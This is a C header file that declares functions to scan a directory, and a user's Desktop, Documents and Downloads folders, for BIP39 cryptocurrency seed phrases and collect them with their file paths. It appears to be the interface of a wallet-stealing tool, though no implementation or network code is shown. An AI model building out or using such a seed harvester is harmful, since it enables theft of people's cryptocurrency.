#ifndef SEED_GRABBER_H
#define SEED_GRABBER_H

#include <stddef.h>

/* Scan a directory for files containing BIP39 seed phrases.
 * Writes found phrases to `output` (newline-separated).
 * Returns 0 on success, -1 on error. */
int seed_grabber_scan(const char *dir, char *output, size_t outlen);

/* Scan standard user directories (Desktop, Documents, Downloads, etc.)
 * Collects all seed phrases found. Output format: "file_path: phrase\n" */
int seed_grabber_collect(char *output, size_t outlen);

#endif
